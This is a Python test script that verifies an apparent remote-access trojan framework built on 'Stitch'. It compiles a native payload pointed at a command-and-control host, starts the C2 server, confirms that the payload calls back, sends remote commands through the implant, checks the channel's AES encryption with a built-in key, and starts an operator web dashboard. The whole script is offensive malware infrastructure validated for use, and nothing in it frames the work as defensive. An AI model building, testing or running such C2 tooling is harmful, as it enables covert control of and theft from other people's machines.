#!/usr/bin/env python3
"""
FINAL 100% VERIFICATION
Tests all critical functionality
"""

import os, sys, time, threading, subprocess, signal, socket, requests
sys.path.insert(0, '/workspace')

def log(msg, status="INFO"):
    colors = {"PASS": "\033[92m", "FAIL": "\033[91m", "INFO": "\033[94m"}
    print(f"{colors.get(status, '')}[{status}] {msg}\033[0m")

results = {}
c2_port = 17700

print("=" * 80)
print("FINAL 100% VERIFICATION TEST")
print("=" * 80)

# Test 1: Compilation
log("\nTEST 1: Payload Compilation", "INFO")
os.chdir('/workspace/native_payloads')
env = os.environ.copy()
env['C2_HOST'] = '127.0.0.1'
env['C2_PORT'] = str(c2_port)
result = subprocess.run(['bash', './build.sh'], capture_output=True, env=env, timeout=30)
if result.returncode == 0 and os.path.exists('/workspace/native_payloads/output/payload_native'):
    log("✅ PASS: Compilation", "PASS")
    results['compilation'] = True
else:
    log("❌ FAIL: Compilation", "FAIL")
    results['compilation'] = False
    sys.exit(1)

# Test 2: C2 Server
log("\nTEST 2: C2 Server Startup", "INFO")
from Application import stitch_cmd
server = stitch_cmd.stitch_server()
server.l_port = c2_port

def run_c2():
    server.run_server()
c2_thread = threading.Thread(target=run_c2, daemon=True)
c2_thread.start()
time.sleep(3)

sock_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if sock_test.connect_ex(('127.0.0.1', c2_port)) == 0:
    log("✅ PASS: C2 Server", "PASS")
    results['c2_server'] = True
else:
    log("❌ FAIL: C2 Server", "FAIL")
    results['c2_server'] = False
    sys.exit(1)
sock_test.close()

# Test 3: Payload Connection
log("\nTEST 3: Payload Connection", "INFO")
payload_proc = subprocess.Popen(['/workspace/native_payloads/output/payload_native'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
time.sleep(5)

# Use SAME server instance
if len(server.inf_sock) > 0:
    log("✅ PASS: Connection", "PASS")
    results['connection'] = True
else:
    log("❌ FAIL: Connection", "FAIL")
    results['connection'] = False
    sys.exit(1)

# Test 4: Multi-Command Execution
log("\nTEST 4: Multi-Command Execution (CRITICAL)", "INFO")
from native_protocol_bridge import send_command_to_native_payload

# Get latest connection (payload might reconnect)
time.sleep(1)  # Let connections settle
target_id = list(server.inf_sock.keys())[-1]  # Get most recent connection
sock = server.inf_sock[target_id]
log(f"Testing on connection: {target_id}", "INFO")

commands = ['ping', 'sysinfo', 'pwd', 'ping', 'sysinfo']
success_count = 0
for i, cmd in enumerate(commands, 1):
    success, output = send_command_to_native_payload(sock, cmd)
    if success:
        success_count += 1
        log(f"  {i}/{len(commands)}: {cmd} ✅", "PASS")
    else:
        log(f"  {i}/{len(commands)}: {cmd} ❌ - {output}", "FAIL")
        break
    time.sleep(1)

if success_count == len(commands):
    log(f"✅ PASS: All {len(commands)} commands executed", "PASS")
    results['multi_command'] = True
else:
    log(f"❌ FAIL: Only {success_count}/{len(commands)} commands worked", "FAIL")
    results['multi_command'] = False

# Test 5: Encryption
log("\nTEST 5: Encryption", "INFO")
try:
    from python_aes_bridge import decrypt_response, SIMPLE_PROTOCOL_KEY
    from Crypto.Cipher import AES
    from Crypto.Util import Counter
    
    test_data = b"Test123"
    ctr = Counter.new(128, initial_value=0, little_endian=False)
    cipher = AES.new(SIMPLE_PROTOCOL_KEY, AES.MODE_CTR, counter=ctr)
    encrypted = cipher.encrypt(test_data)
    decrypted = decrypt_response(encrypted, bytes([0]*8))
    
    if decrypted == test_data:
        log("✅ PASS: Encryption", "PASS")
        results['encryption'] = True
    else:
        log("❌ FAIL: Encryption", "FAIL")
        results['encryption'] = False
except Exception as e:
    log(f"❌ FAIL: Encryption - {e}", "FAIL")
    results['encryption'] = False

# Test 6: Web Dashboard
log("\nTEST 6: Web Dashboard", "INFO")
web_proc = subprocess.Popen(['python3', '/workspace/web_app_real.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, env={'STITCH_WEB_PORT': '17800', 'STITCH_DEBUG': 'true'})
time.sleep(5)
try:
    response = requests.get('http://127.0.0.1:17800/', timeout=5)
    if response.status_code in [200, 302]:
        log("✅ PASS: Web Dashboard", "PASS")
        results['web_dashboard'] = True
    else:
        log("❌ FAIL: Web Dashboard", "FAIL")
        results['web_dashboard'] = False
except Exception as e:
    log("❌ FAIL: Web Dashboard", "FAIL")
    results['web_dashboard'] = False
finally:
    try:
        web_proc.kill()
    except:
        pass

# Test 7: Integration Tests
log("\nTEST 7: Integration Validator", "INFO")
result = subprocess.run(['python3', '/workspace/INTEGRATION_VALIDATOR.py'], capture_output=True, timeout=120)
if "ALL TESTS PASSED" in result.stdout.decode() or "100%" in result.stdout.decode():
    log("✅ PASS: Integration Tests", "PASS")
    results['integration'] = True
else:
    log("❌ FAIL: Integration Tests", "FAIL")
    results['integration'] = False

# Cleanup
try:
    os.killpg(os.getpgid(payload_proc.pid), signal.SIGKILL)
except:
    pass

# Final Report
print("\n" + "=" * 80)
print("FINAL RESULTS")
print("=" * 80)

total = len(results)
passed = sum(1 for v in results.values() if v)

for test, result in results.items():
    status = "✅ PASS" if result else "❌ FAIL"
    log(f"{status}: {test}", "PASS" if result else "FAIL")

percentage = (passed / total * 100) if total > 0 else 0

print("=" * 80)
log(f"TOTAL: {passed}/{total} tests passed ({percentage:.0f}%)", "PASS" if percentage == 100 else "FAIL")

if percentage == 100:
    print()
    log("✅✅✅ VERIFIED: System is 100% FUNCTIONAL ✅✅✅", "PASS")
    print()
    sys.exit(0)
else:
    print()
    log(f"❌ HONEST RESULT: System is {percentage:.0f}% functional", "FAIL")
    log("NOT 100% COMPLETE", "FAIL")
    print()
    sys.exit(1)
